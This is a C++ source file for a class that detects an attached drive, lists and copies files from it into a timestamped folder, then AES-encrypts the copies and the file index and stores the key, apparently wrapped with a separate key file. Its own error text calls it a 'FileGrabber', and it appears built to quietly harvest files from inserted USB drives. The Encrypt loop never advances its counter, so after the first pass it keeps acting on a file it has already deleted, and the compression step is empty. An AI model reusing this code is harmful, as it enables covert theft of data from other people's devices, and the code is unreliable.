#include "stdafx.h"
#include "FileCopyer.h"
#include <filesystem>
#include "AESKey.h"
#include "AESEncrypt.h"
#include "Convert.h"
#include <zlib.h>
using namespace std;
namespace fs = std::filesystem;

FileCopyer::FileCopyer(const Device& device, shared_ptr<list<FileData>> paths)
{
	this->device = device;
	this->paths = paths;
	key = AESKey();
}

void FileCopyer::ListFile(shared_ptr<list<FileData>> plist)
{
	TCHAR* folderName = new TCHAR[100];
	SYSTEMTIME time = device.GetDiskArriveTime();
	_stprintf_s(folderName, 100, TEXT("%u-%u-%u %02u.%02u.%02u - %u"), time.wYear, time.wMonth, time.wDay, time.wHour, time.wMinute,
		time.wSecond, device.GetDiskInformation().VolumeSerialNumber);
	fs::create_directory(fs::path(folderName));
	_tstring fn = folderName;
	delete[] folderName;
	folderName = nullptr;
	FILE* file;
	_tfopen_s(&file, (fn + TEXT("/flist.ifld")).c_str(), TEXT("w"));
	Device::DiskInformation info = device.GetDiskInformation();
	_ftprintf_s(file, TEXT("Basic Information\n--------------------------\nDrive Letter: %c\nLabel: %s\nSN: %lu\nFileSystem: %s\nSpace: %llu\n\nFile List\n--------------------------\n"),
		info.DriveLetter, info.Label.c_str(), info.VolumeSerialNumber, info.FileSystem.c_str(), info.TotalSpace);
	for (list<FileData>::const_iterator it = plist->cbegin(); it != plist->cend(); ++it) {
		_ftprintf_s(file, L"%s/%s\n", it->Directory, it->name);
	}
	fclose(file);
	AESEncrypt enc(key);
	enc.Encrypt((fn + TEXT("/flist.ifld")).c_str(), (fn + TEXT("/flist.ifl")).c_str());
	fs::remove(fs::path((fn + TEXT("/flist.ifld")).c_str()));
}

void FileCopyer::Copy()
{
	TCHAR* folderName = new TCHAR[100];
	SYSTEMTIME time = device.GetDiskArriveTime();
	_stprintf_s(folderName, 100, TEXT("%u-%u-%u %02u.%02u.%02u - %u"), time.wYear, time.wMonth, time.wDay, time.wHour, time.wMinute,
		time.wSecond, device.GetDiskInformation().VolumeSerialNumber);
	_tstring fn = folderName;
	delete[] folderName;
	folderName = nullptr;
	int name = 1;
	for (const FileData& data : *paths) {
		_tstring path = _tstring(data.Directory) + TEXT("/") + data.name;
		fs::copy(fs::path(path), fs::path(fn + TEXT("/") + to_wstring(name) + TEXT(".igfd")));
		++name;
	}
}

void FileCopyer::Encrypt() {
	Convert convert;
	TCHAR* folderName = new TCHAR[100];
	SYSTEMTIME time = device.GetDiskArriveTime();
	_stprintf_s(folderName, 100, TEXT("%u-%u-%u %02u.%02u.%02u - %u"), time.wYear, time.wMonth, time.wDay, time.wHour, time.wMinute,
		time.wSecond, device.GetDiskInformation().VolumeSerialNumber);
	_tstring folder = folderName;
	delete[] folderName;
	folderName = nullptr;
	FILE* table;
	AESEncrypt enc(key);
	key.WriteAESKey(convert.toANSIString(folder + L"/key.iae").c_str(), "enc.ipk");
	_tfopen_s(&table, (folder + TEXT("/fnenc.impd")).c_str(), TEXT("wt"));
	if (table == NULL) {
		throw runtime_error("FileGrabber IO Error: Cannot write FileList File.");
		return;
	}
	int name = 1;
	for (const FileData& data : *paths) {
		_tstring path = folder + TEXT("/") + to_wstring(name);
		enc.Encrypt((path + TEXT(".igfd")).c_str(), (path + TEXT(".igf")).c_str());
		fs::remove(fs::path(path + TEXT(".igfd")));
		_ftprintf_s(table, TEXT("%d %s/%s\n"), name, data.Directory, data.name);
	}
	fclose(table);
	enc.Encrypt((TEXT("./") + folder + TEXT("/fnenc.impd")).c_str(), (TEXT("./") + folder + TEXT("/fnenc.imp")).c_str());
	fs::remove(fs::path(folder + TEXT("/fnenc.impd")));
}

void FileCopyer::Compress()
{
}
